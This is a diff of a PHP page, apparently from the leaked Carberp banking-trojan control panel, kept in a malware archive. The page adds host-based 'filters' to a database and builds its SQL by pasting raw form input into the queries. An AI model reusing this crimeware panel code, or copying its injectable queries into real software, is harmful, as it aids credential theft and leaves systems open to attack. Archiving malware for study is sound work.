@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 smarty_assign_add('javascript_end', '<script type="text/javascript" src="/js/add_filter.js"></script>');
@@ -15,7 +26,9 @@ if(empty($Cur['id'])){
 		if(empty($_POST['host'])){
 			$bad_form['host'] = 'Сайт не может быть пустым.';
 			$FORM_BAD = 1;
-		}else{			if($mysqli->query_name('SELECT host from bf_filters WHERE host = \''.$_POST['host'].'\' LIMIT 1', null, 'host') == $_POST['host']){				$bad_form['host'] = 'Данный сайт уже есть в системе.';
+		}else{
+			if($mysqli->query_name('SELECT host from bf_filters WHERE host = \''.$_POST['host'].'\' LIMIT 1', null, 'host') == $_POST['host']){
+				$bad_form['host'] = 'Данный сайт уже есть в системе.';
 				$FORM_BAD = 1;
 			}
 		}
@@ -50,7 +63,8 @@ if(empty($Cur['id'])){
 			*/
 		}
 
-		if($FORM_BAD <> 1){            $insert_id = $mysqli->query("INSERT INTO bf_filters (name, fields, host, enable, parent_id) VALUES ('".$_POST['name']."', '".json_encode($_POST['p'])."', '".$_POST['host']."', '1', '0')");
+		if($FORM_BAD <> 1){
+            $insert_id = $mysqli->query("INSERT INTO bf_filters (name, fields, host, enable, parent_id) VALUES ('".$_POST['name']."', '".json_encode($_POST['p'])."', '".$_POST['host']."', '1', '0')");
 
             if($insert_id == false){
 				$errors .= '<div class="t"><div class="t4" align="center">Создание фильтра сейчас невозможно, попробуйте позже.</div></div>';
@@ -81,7 +95,8 @@ if(empty($Cur['id'])){
 }else{
 	$parent = $mysqli->query('SELECT * from bf_filters WHERE id = '.$Cur['id'].' LIMIT 1');
 
-	if($parent->id != $Cur['id'] || !empty($parent->host)){		header('Location: /catalog/');
+	if($parent->id != $Cur['id'] || !empty($parent->host)){
+		header('Location: /catalog/');
 		exit;
 	}
 
